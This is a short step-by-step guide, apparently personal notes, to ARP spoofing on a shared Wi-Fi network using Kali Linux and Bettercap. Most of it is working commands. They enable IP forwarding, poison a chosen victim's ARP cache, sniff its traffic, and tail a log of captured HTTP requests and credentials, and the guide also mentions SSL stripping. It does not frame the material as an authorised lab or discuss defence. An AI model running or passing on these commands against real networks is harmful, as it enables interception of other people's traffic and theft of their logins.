### 🧱 1. Devices & Network

- **Attacker PC**: Kali Linux (your machine)
    
- **Victim device**: Any (phone or PC)
    
- Both devices must be:
    
    - Connected to same Wi-Fi
        
    - Have IPs like `192.168.14.x


### 🔁 2. Enable IP Forwarding

Without this, packets don’t flow between victim and router:

~~~bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
~~~
To make it permanent (optional):
~~~bash
sudo nano /etc/sysctl.conf
~~~
Uncomment or add:
~~~ini
net.ipv4.ip_forward=1
~~~

### 🕵️ 4. Run Bettercap

Start with:
~~~bash
sudo bettercap -iface wlan0
~~~
Inside Bettercap shell:
~~~bash
net.probe on
net.recon on
net.show                    # lists other devices
set arp.spoof.targets <victim-ip>
set arp.spoof.internal true
arp.spoof on
net.sniff on
~~~
### 📡 5. Check if Victim is Intercepted

**From victim**, run:
~~~bash
arp -a
~~~
If the **gateway IP** now shows Kali's **MAC address**, ARP spoofing is working.

Example:
~~~ruby
Gateway IP: 192.168.14.1 -> 08:00:27:aa:bb:cc (Kali's MAC)
~~~
### 🔐 6. Only Intercept HTTP, Not HTTPS

Modern websites use **HTTPS**, which is encrypted. You **can't see** credentials unless:

- The victim accesses **HTTP** (not HTTPS) site
    
- Or you set up **SSL stripping**, which is advanced
    

So test with:
~~~arduino
http://<Kali-IP>/login.html
~~~

### 📄 7. View Sniffed Data

In Bettercap:
~~~bash
net.sniff on
~~~
Then on Kali:
~~~bash
tail -f ~/.bettercap.sniffer.log
~~~
You’ll see captured HTTP requests and headers here.
